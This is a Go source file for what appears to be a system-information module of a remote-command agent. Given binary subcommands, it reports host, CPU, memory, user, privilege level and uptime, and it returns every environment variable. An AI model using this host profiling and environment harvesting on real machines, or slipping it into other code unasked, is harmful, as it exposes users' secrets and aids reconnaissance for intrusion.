package commands

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"os"
	"runtime"
	"time"

	"github.com/shirou/gopsutil/v3/cpu"
	"github.com/shirou/gopsutil/v3/host"
	"github.com/shirou/gopsutil/v3/mem"
)

// SysInfoHandler handles system information commands
type SysInfoHandler struct{}

// NewSysInfoHandler creates a new system information handler
func NewSysInfoHandler() *SysInfoHandler {
	return &SysInfoHandler{}
}

// Handle processes system information commands
func (s *SysInfoHandler) Handle(data []byte) ([]byte, error) {
	if len(data) < 4 {
		return writeError(fmt.Errorf("invalid sysinfo command data")), nil
	}

	subCommand := binary.LittleEndian.Uint32(data[:4])

	switch subCommand {
	case SYSINFO_OVERVIEW:
		return s.getSystemOverview()
	case SYSINFO_ENVIRONMENT:
		return s.getEnvironmentInfo()
	case SYSINFO_SPECS:
		return s.getSystemSpecs()
	case SYSINFO_UPTIME:
		return s.getUptime()
	default:
		return writeError(fmt.Errorf("unknown sysinfo subcommand: %d", subCommand)), nil
	}
}

// getSystemOverview returns comprehensive system information
func (s *SysInfoHandler) getSystemOverview() ([]byte, error) {
	buf := new(bytes.Buffer)

	// Get host information
	hostInfo, err := host.Info()
	if err != nil {
		return writeError(err), nil
	}

	// Write basic system info
	writeString(buf, hostInfo.Hostname)
	writeString(buf, hostInfo.OS)
	writeString(buf, hostInfo.Platform)
	writeString(buf, hostInfo.PlatformFamily)
	writeString(buf, hostInfo.PlatformVersion)
	writeString(buf, hostInfo.KernelVersion)
	writeString(buf, hostInfo.KernelArch)
	binary.Write(buf, binary.LittleEndian, hostInfo.Uptime)

	// Get CPU info
	cpuInfo, err := cpu.Info()
	if err == nil && len(cpuInfo) > 0 {
		writeString(buf, cpuInfo[0].ModelName)
		binary.Write(buf, binary.LittleEndian, uint32(cpuInfo[0].Cores))
		binary.Write(buf, binary.LittleEndian, uint32(len(cpuInfo)))
		binary.Write(buf, binary.LittleEndian, cpuInfo[0].Mhz)
	} else {
		writeString(buf, "Unknown CPU")
		binary.Write(buf, binary.LittleEndian, uint32(runtime.NumCPU()))
		binary.Write(buf, binary.LittleEndian, uint32(runtime.NumCPU()))
		binary.Write(buf, binary.LittleEndian, float64(0))
	}

	// Get memory info
	memInfo, err := mem.VirtualMemory()
	if err == nil {
		binary.Write(buf, binary.LittleEndian, memInfo.Total)
		binary.Write(buf, binary.LittleEndian, memInfo.Available)
		binary.Write(buf, binary.LittleEndian, memInfo.Used)
		binary.Write(buf, binary.LittleEndian, memInfo.UsedPercent)
	} else {
		binary.Write(buf, binary.LittleEndian, uint64(0))
		binary.Write(buf, binary.LittleEndian, uint64(0))
		binary.Write(buf, binary.LittleEndian, uint64(0))
		binary.Write(buf, binary.LittleEndian, float64(0))
	}

	// Get current user
	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("USERNAME")
	}
	writeString(buf, username)

	// Get current working directory
	wd, err := os.Getwd()
	if err != nil {
		wd = "Unknown"
	}
	writeString(buf, wd)

	// Get process ID
	binary.Write(buf, binary.LittleEndian, uint32(os.Getpid()))

	// Check if running as admin/root
	isAdmin := uint32(0)
	if os.Geteuid() == 0 {
		isAdmin = 1
	}
	binary.Write(buf, binary.LittleEndian, isAdmin)

	return writeSuccess(buf.Bytes()), nil
}

// getEnvironmentInfo returns environment variables and system paths
func (s *SysInfoHandler) getEnvironmentInfo() ([]byte, error) {
	buf := new(bytes.Buffer)

	// Get all environment variables
	env := os.Environ()
	binary.Write(buf, binary.LittleEndian, uint32(len(env)))

	for _, envVar := range env {
		writeString(buf, envVar)
	}

	// Get important paths
	paths := map[string]string{
		"HOME":    os.Getenv("HOME"),
		"PATH":    os.Getenv("PATH"),
		"TEMP":    os.Getenv("TEMP"),
		"TMP":     os.Getenv("TMP"),
		"GOPATH":  os.Getenv("GOPATH"),
		"GOROOT":  os.Getenv("GOROOT"),
	}

	// For Windows, add more paths
	if isWindows() {
		paths["USERPROFILE"] = os.Getenv("USERPROFILE")
		paths["PROGRAMFILES"] = os.Getenv("PROGRAMFILES")
		paths["SYSTEMROOT"] = os.Getenv("SYSTEMROOT")
		paths["WINDIR"] = os.Getenv("WINDIR")
	}

	binary.Write(buf, binary.LittleEndian, uint32(len(paths)))
	for key, value := range paths {
		writeString(buf, key)
		writeString(buf, value)
	}

	return writeSuccess(buf.Bytes()), nil
}

// getSystemSpecs returns detailed hardware specifications
func (s *SysInfoHandler) getSystemSpecs() ([]byte, error) {
	buf := new(bytes.Buffer)

	// Runtime information
	writeString(buf, runtime.GOOS)
	writeString(buf, runtime.GOARCH)
	writeString(buf, runtime.Version())
	binary.Write(buf, binary.LittleEndian, uint32(runtime.NumCPU()))
	binary.Write(buf, binary.LittleEndian, uint32(runtime.NumGoroutine()))

	// Detailed CPU information
	cpuInfo, err := cpu.Info()
	if err == nil && len(cpuInfo) > 0 {
		cpu := cpuInfo[0]
		writeString(buf, cpu.VendorID)
		writeString(buf, cpu.Family)
		writeString(buf, cpu.Model)
		writeString(buf, cpu.ModelName)
		writeString(buf, fmt.Sprintf("%d", cpu.Stepping))
		binary.Write(buf, binary.LittleEndian, cpu.Mhz)
		binary.Write(buf, binary.LittleEndian, uint32(cpu.CacheSize))
		binary.Write(buf, binary.LittleEndian, uint32(cpu.Cores))
		
		// CPU flags
		flags := cpu.Flags
		binary.Write(buf, binary.LittleEndian, uint32(len(flags)))
		for _, flag := range flags {
			writeString(buf, flag)
		}
	} else {
		// Fallback values
		writeString(buf, "Unknown")
		writeString(buf, "Unknown")
		writeString(buf, "Unknown")
		writeString(buf, "Unknown CPU")
		writeString(buf, "Unknown")
		binary.Write(buf, binary.LittleEndian, float64(0))
		binary.Write(buf, binary.LittleEndian, uint32(0))
		binary.Write(buf, binary.LittleEndian, uint32(runtime.NumCPU()))
		binary.Write(buf, binary.LittleEndian, uint32(0)) // No flags
	}

	// Memory details
	memInfo, err := mem.VirtualMemory()
	if err == nil {
		binary.Write(buf, binary.LittleEndian, memInfo.Total)
		binary.Write(buf, binary.LittleEndian, memInfo.Available)
		binary.Write(buf, binary.LittleEndian, memInfo.Used)
		binary.Write(buf, binary.LittleEndian, memInfo.Free)
		binary.Write(buf, binary.LittleEndian, memInfo.Cached)
		binary.Write(buf, binary.LittleEndian, memInfo.Buffers)
		binary.Write(buf, binary.LittleEndian, memInfo.UsedPercent)
	}

	// Swap memory
	swapInfo, err := mem.SwapMemory()
	if err == nil {
		binary.Write(buf, binary.LittleEndian, swapInfo.Total)
		binary.Write(buf, binary.LittleEndian, swapInfo.Used)
		binary.Write(buf, binary.LittleEndian, swapInfo.Free)
		binary.Write(buf, binary.LittleEndian, swapInfo.UsedPercent)
	}

	return writeSuccess(buf.Bytes()), nil
}

// getUptime returns system uptime information
func (s *SysInfoHandler) getUptime() ([]byte, error) {
	buf := new(bytes.Buffer)

	hostInfo, err := host.Info()
	if err != nil {
		return writeError(err), nil
	}

	// System uptime
	binary.Write(buf, binary.LittleEndian, hostInfo.Uptime)

	// Boot time
	binary.Write(buf, binary.LittleEndian, hostInfo.BootTime)

	// Current time
	now := time.Now()
	binary.Write(buf, binary.LittleEndian, now.Unix())

	// Format uptime as human readable
	uptime := time.Duration(hostInfo.Uptime) * time.Second
	days := int(uptime.Hours()) / 24
	hours := int(uptime.Hours()) % 24
	minutes := int(uptime.Minutes()) % 60

	uptimeStr := fmt.Sprintf("%d days, %d hours, %d minutes", days, hours, minutes)
	writeString(buf, uptimeStr)

	// Boot time as human readable
	bootTime := time.Unix(int64(hostInfo.BootTime), 0)
	writeString(buf, bootTime.Format("2006-01-02 15:04:05"))

	// Current time as human readable
	writeString(buf, now.Format("2006-01-02 15:04:05"))

	return writeSuccess(buf.Bytes()), nil
}